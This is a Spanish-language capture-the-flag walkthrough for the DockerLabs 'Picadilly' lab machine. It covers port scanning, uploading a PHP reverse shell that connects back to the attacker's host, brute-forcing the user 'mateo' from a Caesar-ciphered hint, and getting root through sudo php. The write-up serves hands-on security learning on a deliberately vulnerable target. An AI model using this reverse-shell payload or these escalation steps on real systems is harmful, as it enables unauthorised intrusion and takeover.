---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Picadilly DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip picadilly.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh picadilly.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 14:57 EST
Nmap scan report for express.dl (172.17.0.2)
Host is up (0.000024s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.59
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 215   2024-05-18 01:19  backup.txt
|_
443/tcp open  ssl/http Apache httpd 2.4.59 ((Debian))
|_http-title: Picadilly
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=50a6ca252ff4
| Subject Alternative Name: DNS:50a6ca252ff4
| Not valid before: 2024-05-18T06:29:06
|_Not valid after:  2034-05-16T06:29:06
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: picadilly.lab

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.21 seconds
```

Si entramos en el `443` que parece interesante, veremos una pagina normal que abajo del todo se puede subir un archivo, por lo que probaremos a subir un `PHP` para crearnos una `reverse shell`.

## Escalate user www-data

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Si subimos el archivo `shell.php` veremos que nos deja subirlo y que se habra subido correctamente, por lo que haremos `fuzzing` para ver donde se encuentra el directorio donde se almaceno nuestro archivo:

### Gobuster

```shell
gobuster dir -u https://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/index.php            (Status: 200) [Size: 3719]
/server-status        (Status: 403) [Size: 276]
/uploads.php          (Status: 200) [Size: 3719]
/uploads              (Status: 200) [Size: 1137]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que hay un directorio llamado `uploads/` por lo que tiene toda la pinta de que estara ahi.

```
URL = https://<IP>/uploads/
```

Si entramos ahi dentro veremos que esta nuestro archivo `shell.php` por lo que nos pondremos a la escucha antes de ejecutarlo:

```shell
nc -lvnp <PORT>
```

Y desde la web pinchamos a nuestro archivo que subimos, una vez echo esto si nos vamos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.120.128] from (UNKNOWN) [172.17.0.2] 49694
whoami
www-data
```

Por lo que vemos ya hemos entrado con el usuario `www-data`.

### Sanitizamos la shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user mateo

Si leemos el siguiente archivo en esta ruta:

```shell
cat /var/www/picadilly/backup.txt
```

Info:

```
/// The users mateo password is ////


----------- hdvbfuadcb ------------

"To solve this riddle, think of an ancient Roman emperor and his simple method of shifting letters."

////////////////////////////////////
```

Vemos que no esta diciendo la contraseña de `mateo`, pero esta cifrada...

<figure><img src="../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

Vemos que esta cifrado en `Cesar`, y nos da esas opciones de contraseña, por lo que vamos hacer un diccionario de todos esos resultado para ver cual de todas puede ser, utilizando una herramienta llamado `suBrutefoce.sh`.

> dic.txt

```
easycrazy
tphnrgmpon
gcuaetzcba
yumswlruts
vrjptiorqp
uqioshnqpo
sogmqflonm
pldjncilkj
rnflpeknml
okcimbhkji
iewcgvbedc
awouyntwvu
miagkzfihg
kgyeixdgfe
njbhlagjih
fbtzdsybaz
qmekodjmlk
zvntxmsvut
wskqujpsrq
cyqwapvyxw
lhzfjyehgf
jfxdhwcfed
bxpvzouxwv
xtlrvkqtsr
dzrxbqwzyx
```

Nos descargamos la herramienta en el siguiente link:

URL = [suBruteforce.sh GitHub](https://github.com/D1se0/suBruteforce/blob/main/suBruteforceBash/suBruteforce.sh)

Solo tendremos que copiar el codigo y pegarlo en el archivo que creemos en `/tmp`.

```shell
vim suBruteforce.sh
#<PRESS_i>
#<SCRIPT_PASTE>
#<ESC>
#<:wq> Para guardar y salir
```

Una vez que tengamos el script cargado en el sistema, ponemos permisos de ejecuccion:

```shell
chmod +x suBruteforce.sh
```

Y haremos lo mismo con el archivo de contraseñas:

```shell
vim dic.txt
#<PRESS_i>
#<PASTE_KEYS>
#<ESC>
#<:wq> Para guardar y salir
```

Y utilizaremos la herramienta de la siguiente forma:

```shell
bash suBruteforce.sh mateo dic.txt
```

Info:

```
[+] Contraseña encontrada para el usuario mateo:easycrazy
```

Por lo que escalaremos al usuario `mateo`.

```shell
su mateo
```

Metemos como contraseña `easycrazy` y veremos que somos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for mateo on c8332aa1fb59:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mateo may run the following commands on c8332aa1fb59:
    (ALL) NOPASSWD: /usr/bin/php
```

Veremos que podemos ejecutar el binario `php` como el usuario `root`, por lo que haremos lo siguiente:

```shell
CMD="/bin/bash"
sudo php -r "system('$CMD');"
```

Con esto seremos `root` y habremos terminado la maquina.
